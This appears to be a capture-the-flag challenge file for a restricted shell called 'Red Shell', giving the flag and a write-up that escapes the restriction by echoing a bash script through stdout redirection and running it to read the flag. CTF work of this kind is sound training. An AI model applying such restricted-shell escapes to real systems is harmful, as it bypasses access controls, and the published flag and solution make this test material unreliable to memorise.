# Red Shell

# Description
- Our latest patch added basic stdout redirection!

# Difficulty
- 2

# Flag
- PCTF{hay_p@is@n0s_itS_thesup3r_MARIO_sup3r_ShoW!}

# Hints
- Those are some interesting permissions

# Author Name & Discord
- Brandon "Veryyes" Wong

# Challenge Tester

# Write Up
The shell prevents the user from running any binaries besides the ones in the current directory (`ls` and `echo`). Creating a file with the stdout redirection `>` will give that file 0777 permissions. So in order to call `cat` on the flag file which is located at `/` the user must echo a script and execute it.

```
RShll> echo -e #!/bin/bash\ncat ../flag > solve
echo -e #!/bin/bash\ncat ../flag > solve
RShll> ./solve
./solve
PCTF{hay_p@is@n0s_itS_thesup3r_MARIO_sup3r_ShoW!}
```